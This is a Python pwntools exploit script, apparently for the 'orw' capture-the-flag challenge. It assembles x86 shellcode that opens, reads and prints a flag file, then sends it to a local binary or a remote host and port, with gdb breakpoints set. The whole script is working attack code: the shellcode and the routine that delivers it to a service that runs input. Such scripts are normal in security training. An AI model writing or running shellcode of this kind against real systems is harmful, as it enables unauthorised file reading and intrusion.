#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

def sh():
  s = '''
     xor ecx, ecx
    mul ecx
  mov al, 0x05
  push ecx
  push 0x67616c66
  push 0x2f77726f
  push 0x2f656d6f
  push 0x682f2f2f
  mov ebx, esp
  int 0x80
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov dx, 0x0FFF
  inc edx
  int 0x80
  xchg eax, edx
  mov bl, 0x01
  shr eax, 0x0A
  int 0x80
        '''

  return asm(s)


def exploit(r):

    r.recvuntil("shellcode:")
    buf = ""
    r.sendline(sh())
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pause()
        exploit(r)
    else:
        r = process('./orw')     #put binary here
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804857d",
            "b *0x8048585",
            "b *0x804858c",
            "c"


        ]
        #gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        r = gdb.debug("./orw",gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        pause()
        exploit(r)


